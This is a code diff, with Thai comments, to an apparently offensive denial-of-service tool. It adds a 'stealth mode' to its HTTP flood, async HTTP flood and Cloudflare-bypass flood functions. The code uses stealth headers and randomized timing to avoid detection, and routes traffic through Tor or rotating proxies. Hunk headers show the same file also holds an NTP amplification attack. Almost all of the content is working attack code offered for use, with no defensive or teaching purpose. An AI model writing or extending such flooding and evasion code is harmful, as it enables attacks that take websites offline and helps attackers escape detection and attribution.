@@ -8,7 +8,7 @@ import aiohttp  # นำเข้าโมดูล aiohttp สำหรับ a
 import concurrent.futures  # นำเข้าโมดูล concurrent.futures สำหรับ ThreadPoolExecutor
 from scapy.all import *  # นำเข้าโมดูล scapy สำหรับ packet crafting
 from src.config import CONFIG  # นำเข้าการตั้งค่าจาก config
-from src.utils import get_random_headers, load_file_lines  # นำเข้าฟังก์ชันยูทิลิตี้
+from src.utils import get_random_headers, load_file_lines, generate_stealth_headers, randomize_timing  # นำเข้าฟังก์ชันยูทิลิตี้
 from src.security import increment_thread_counter, decrement_thread_counter, increment_socket_counter, decrement_socket_counter
 from rich.console import Console
 from rich.table import Table
@@ -19,11 +19,14 @@ console = Console()
 
 
 # Layer 7 HTTP Flood (with proxies support)  # สำหรับฟังก์ชัน
-def http_flood(url, duration, proxies=None, monitor=None, max_requests=0, use_tor=False):  # ฟังก์ชันโจมตี HTTP Flood พื้นฐาน
+def http_flood(url, duration, proxies=None, monitor=None, max_requests=0, use_tor=False, stealth_mode=False):  # ฟังก์ชันโจมตี HTTP Flood พื้นฐาน
     """Basic HTTP GET flood with proxy support"""  # ของฟังก์ชัน
     try:
         end_time = time.time() + duration  # คำนวณเวลาสิ้นสุดการโจมตี
         session = requests.Session()  # สร้าง session สำหรับ HTTP requests
+        
+        # Stealth mode setup
+        stealth_headers = generate_stealth_headers() if stealth_mode else None
 
         while time.time() < end_time:  # วนลูปจนกว่าจะถึงเวลาสิ้นสุด
             if max_requests > 0 and monitor and monitor.packets_sent >= max_requests:
@@ -34,7 +37,12 @@ def http_flood(url, duration, proxies=None, monitor=None, max_requests=0, use_to
                     proxy = {"http": CONFIG['TOR_PROXY'], "https": CONFIG['TOR_PROXY']}
                 else:
                     proxy = {"http": random.choice(proxies), "https": random.choice(proxies)} if proxies else None  # เลือกพร็อกซีแบบสุ่ม
-                response = session.get(url, headers=get_random_headers(), proxies=proxy, timeout=5)  # ส่ง GET request
+                headers = stealth_headers if stealth_mode else get_random_headers()
+                response = session.get(url, headers=headers, proxies=proxy, timeout=5)  # ส่ง GET request
+                
+                # Stealth mode timing randomization
+                if stealth_mode:
+                    randomize_timing()
                 if monitor:  # ถ้ามี monitor
                     monitor.update_stats(packets=1, bytes_sent=len(response.content) if response.content else 0)  # อัปเดตสถิติ
             except Exception as e:  # จัดการข้อผิดพลาด
@@ -46,10 +54,12 @@ def http_flood(url, duration, proxies=None, monitor=None, max_requests=0, use_to
 
 
 # Async Layer 7 Advanced (aiohttp for faster)  # สำหรับฟังก์ชัน
-async def async_http_flood(url, duration, proxies_list, monitor=None, max_requests=0, use_tor=False):  # ฟังก์ชันโจมตี HTTP Flood แบบ async
+async def async_http_flood(url, duration, proxies_list, monitor=None, max_requests=0, use_tor=False, stealth_mode=False):  # ฟังก์ชันโจมตี HTTP Flood แบบ async
     """Advanced asynchronous HTTP flood"""  # ของฟังก์ชัน
     connector = aiohttp.TCPConnector(limit=1000)  # สร้าง connector ที่จำกัดการเชื่อมต่อ
     async with aiohttp.ClientSession(connector=connector) as session:  # สร้าง session async ด้วย connector
+        # Stealth mode setup
+        stealth_headers = generate_stealth_headers() if stealth_mode else None
         end_time = time.time() + duration  # คำนวณเวลาสิ้นสุด
         tasks = []  # ลิสต์เก็บ tasks
 
@@ -61,7 +71,8 @@ async def async_http_flood(url, duration, proxies_list, monitor=None, max_reques
                 proxy = CONFIG['TOR_PROXY']
             else:
                 proxy = random.choice(proxies_list) if proxies_list else None  # เลือกพร็อกซีแบบสุ่ม
-            tasks.append(session.get(url, headers=get_random_headers(), proxy=proxy))  # เพิ่ม task
+            headers = stealth_headers if stealth_mode else get_random_headers()
+            tasks.append(session.get(url, headers=headers, proxy=proxy))  # เพิ่ม task
 
             if len(tasks) >= 1000:  # ถ้ามี tasks เยอะ
                 results = await asyncio.gather(*tasks, return_exceptions=True)  # รัน tasks พร้อมกัน
@@ -223,7 +234,7 @@ def ntp_amplification(target_ip, target_port, duration, monitor=None, max_reques
 
 
 # Cloudflare Bypass Techniques  # สำหรับฟังก์ชัน
-def cloudflare_bypass_flood(url, duration, proxies=None, monitor=None, max_requests=0, use_tor=False):  # ฟังก์ชันโจมตี Cloudflare Bypass
+def cloudflare_bypass_flood(url, duration, proxies=None, monitor=None, max_requests=0, use_tor=False, stealth_mode=False):  # ฟังก์ชันโจมตี Cloudflare Bypass
     """HTTP flood with Cloudflare bypass techniques"""  # ของฟังก์ชัน
     end_time = time.time() + duration  # คำนวณเวลาสิ้นสุด
 
@@ -253,19 +264,28 @@ def cloudflare_bypass_flood(url, duration, proxies=None, monitor=None, max_reque
     ]
 
     session = requests.Session()  # สร้าง HTTP session
+    
+    # Stealth mode setup
+    stealth_headers = generate_stealth_headers() if stealth_mode else None
 
     while time.time() < end_time:  # วนลูปจนกว่าจะถึงเวลาสิ้นสุด
         if max_requests > 0 and monitor and monitor.packets_sent >= max_requests:
             break
 
         try:  # ลองส่งคำขอ
-            headers = random.choice(bypass_headers)  # เลือก headers แบบสุ่ม
+            if stealth_mode:
+                headers = stealth_headers if stealth_headers else random.choice(bypass_headers)
+            else:
+                headers = random.choice(bypass_headers)  # เลือก headers แบบสุ่ม
             if use_tor:
                 proxy = {"http": CONFIG['TOR_PROXY'], "https": CONFIG['TOR_PROXY']}
             else:
                 proxy = {"http": random.choice(proxies), "https": random.choice(proxies)} if proxies else None  # เลือกพร็อกซี
 
-            time.sleep(random.uniform(0.1, 1.0))  # รอแบบสุ่ม 0.1-1.0 วินาที
+            if stealth_mode:
+                randomize_timing()
+            else:
+                time.sleep(random.uniform(0.1, 1.0))  # รอแบบสุ่ม 0.1-1.0 วินาที
 
             methods = [session.get, session.post, session.head]  # ลิสต์ของ HTTP methods
             method = random.choice(methods)  # เลือก method แบบสุ่ม
